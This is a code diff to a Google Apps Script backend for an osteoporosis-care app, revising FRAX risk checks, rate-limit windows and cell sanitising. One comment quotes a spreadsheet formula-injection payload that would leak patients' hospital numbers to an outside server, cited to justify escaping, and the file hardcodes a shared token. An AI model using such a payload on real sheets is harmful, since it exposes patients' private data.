@@ -9,7 +9,7 @@
  *      > Deploy.  Saving alone does NOT update the live /exec URL, which is
  *      why an older copy of this script can keep answering requests.
  *   5. Check it worked: open the /exec URL in a browser. You should see
- *      {"ok":true,"service":"osteoporosis-care","protocol":3,"version":"2026-09-24.2", ...}
+ *      {"ok":true,"service":"osteoporosis-care","protocol":3,"version":"2026-09-25", ...}
  *      then run `node tools/verify-backend.js <the /exec URL>` from the repo
  *      (README, "Check the deployed backend"). Until both pass, the fixes in
  *      this file are not live.
@@ -18,7 +18,7 @@
  * Google answers with a login page that the app cannot follow.
  *
  * The first request after deploying moves each tab whose columns changed
- * aside as "<Name> (before 2026-09-24.2)" and starts a fresh one. Nothing is
+ * aside as "<Name> (before 2026-09-25)" and starts a fresh one. Nothing is
  * deleted; patients' phones register again on their own.
  *
  * SECURITY — what this script can and cannot promise:
@@ -49,7 +49,7 @@
  * then accepted (it shows as "pending" until then).
  */
 
-var SCRIPT_VERSION = '2026-09-24.2';
+var SCRIPT_VERSION = '2026-09-25';
 var SHARED_TOKEN = 'mQ6tfi1HQa0fBNbhzt2AoVk_YKMfmX5v';
 var MAX_TEXT = 200;
 var MAX_BODY = 20000;
@@ -198,9 +198,12 @@ function crossCheck(payload) {
     }
     var hasMajor = isPresent(payload.majorFractureRisk);
     var hasHip = isPresent(payload.hipFractureRisk);
-    // A hip fracture is one of the major osteoporotic fractures, so its
-    // 10-year probability can never be the larger of the two.
-    if (hasMajor && hasHip && payload.hipFractureRisk > payload.majorFractureRisk) errors.push('invalid hipFractureRisk');
+    // On a real FRAX report the hip figure is never the larger: a hip fracture
+    // is one of the major osteoporotic fractures. The app's own estimate can
+    // put it above for high-risk profiles, and is sent as it is shown.
+    if (payload.tool === 'FRAX-official' && hasMajor && hasHip && payload.hipFractureRisk > payload.majorFractureRisk) {
+      errors.push('invalid hipFractureRisk');
+    }
     if (payload.tool !== 'incomplete' && !hasMajor && !hasHip) errors.push('missing majorFractureRisk');
   }
   return errors;
@@ -261,7 +264,9 @@ function checkRegistration(payload, nowMs) {
   if (typeof payload.patientId !== 'string' || !HN_PATTERN.test(payload.patientId)) errors.push('invalid patientId');
   else if (payload.hn !== payload.patientId) errors.push('invalid hn');
 
-  var year = new Date(nowMs).getUTCFullYear();
+  // The calendar year in Bangkok, as on the patient's phone: in the first
+  // hours of 1 January the UTC year is still the old one.
+  var year = new Date(nowMs + 7 * 3600000).getUTCFullYear();
   var yob = payload.yearOfBirth;
   if (!isPresent(yob)) errors.push('missing yearOfBirth');
   else if (!isWholeNumber(yob) || year - yob < PATIENT_AGE.min || year - yob > PATIENT_AGE.max) errors.push('invalid yearOfBirth');
@@ -281,10 +286,13 @@ function checkRegistration(payload, nowMs) {
 }
 // ---- end submission rules ----
 
+// Windows are at most six hours: CacheService, which counts them, keeps a
+// value no longer than that (a longer expiry is refused, and would fail
+// every request).
 var LIMITS = {
   perDevicePerHour: 120,
-  perDevicePerDay: 500,
-  registrationsPerHnPerDay: 10,
+  perDevicePerSixHours: 300,
+  registrationsPerHnPerSixHours: 10,
   newDevicesPerHour: 60,
   // Versions of one patient's record for one day, beyond which a record is
   // refused for good rather than queued forever.
@@ -411,8 +419,11 @@ function isActiveDevice(patientId, credential) {
 
 /* ---------- limits ---------- */
 
+var MAX_CACHE_SECONDS = 21600;
+
 /** Counts one request against a window; true once the window is full. Best effort (CacheService). */
 function overLimit(name, limit, seconds) {
+  seconds = Math.min(seconds, MAX_CACHE_SECONDS);
   var cache = CacheService.getScriptCache();
   var key = 'limit:' + name + ':' + Math.floor(Date.now() / (seconds * 1000));
   var used = Number(cache.get(key) || 0);
@@ -426,7 +437,7 @@ function overLimit(name, limit, seconds) {
 function handleRegistration(payload) {
   var errors = checkRegistration(payload, Date.now());
   if (errors.length) return refuse(errors[0]);
-  if (overLimit('reg:' + payload.patientId, LIMITS.registrationsPerHnPerDay, 86400)) return refuse('busy, try again');
+  if (overLimit('reg:' + payload.patientId, LIMITS.registrationsPerHnPerSixHours, 21600)) return refuse('busy, try again');
 
   var credential = credentialFor(payload.deviceKey);
   var devices = devicesFor(payload.patientId);
@@ -477,7 +488,7 @@ function handleRecord(payload) {
   // find out who is enrolled.
   if (!authorised) return refuse('device not registered for this patient');
   if (overLimit('hour:' + credential.id, LIMITS.perDevicePerHour, 3600) ||
-      overLimit('day:' + credential.id, LIMITS.perDevicePerDay, 86400)) {
+      overLimit('six:' + credential.id, LIMITS.perDevicePerSixHours, 21600)) {
     return refuse('rate limited, try later');
   }
 
@@ -599,7 +610,10 @@ function openSheet(name, needData) {
       sheet.setFrozenRows(1);
       return { sheet: sheet, data: [columns] };
     }
-    var header = sheet.getRange(1, 1, 1, columns.length).getValues()[0].map(cellToString);
+    // Only this script's columns are compared: staff may add their own to
+    // the right without the tab being moved aside.
+    var width = Math.min(sheet.getLastColumn(), columns.length);
+    var header = width ? sheet.getRange(1, 1, 1, width).getValues()[0].map(cellToString) : [];
     if (header.join('|') === columns.join('|')) {
       return { sheet: sheet, data: needData === false ? null : sheet.getDataRange().getValues() };
     }
@@ -614,12 +628,15 @@ function openSheet(name, needData) {
 }
 
 /**
- * A value made safe to put in a cell. Google Sheets reads any text that starts
- * with = + - or @ as a formula, and anyone can post here: a "fall cause" of
- * =IMAGE("https://…"&B2:B) would otherwise send other patients' HNs to a
- * stranger's server the next time the sheet is opened. A leading apostrophe
- * makes Sheets keep it as plain text, and is not shown. Numbers stay numbers;
- * objects and arrays are dropped; text is capped.
+ * A value made safe to put in a cell. Every piece of text gets a leading
+ * apostrophe, which Sheets does not show and which makes it keep the text
+ * exactly as sent:
+ *   - text starting with = + - or @ would otherwise be a formula, and anyone
+ *     can post here: a "fall cause" of =IMAGE("https://…"&B2:B) would send
+ *     other patients' HNs to a stranger's server when the sheet is opened;
+ *   - text that looks like a number or a date would otherwise be converted:
+ *     HN "0012345" would be stored as 12345 and never match its phone again.
+ * Numbers stay numbers; objects and arrays are dropped; text is capped.
  */
 function safeCell(value) {
   if (value === null || value === undefined) return '';
@@ -628,7 +645,7 @@ function safeCell(value) {
   if (typeof value === 'boolean') return value;
   if (typeof value !== 'string') return '';
   var text = value.replace(/[\u0000-\u001f\u007f]/g, ' ').slice(0, MAX_TEXT);
-  return /^[=+\-@]/.test(text) ? "'" + text : text;
+  return text === '' ? '' : "'" + text;
 }
 
 function cellToString(value) {
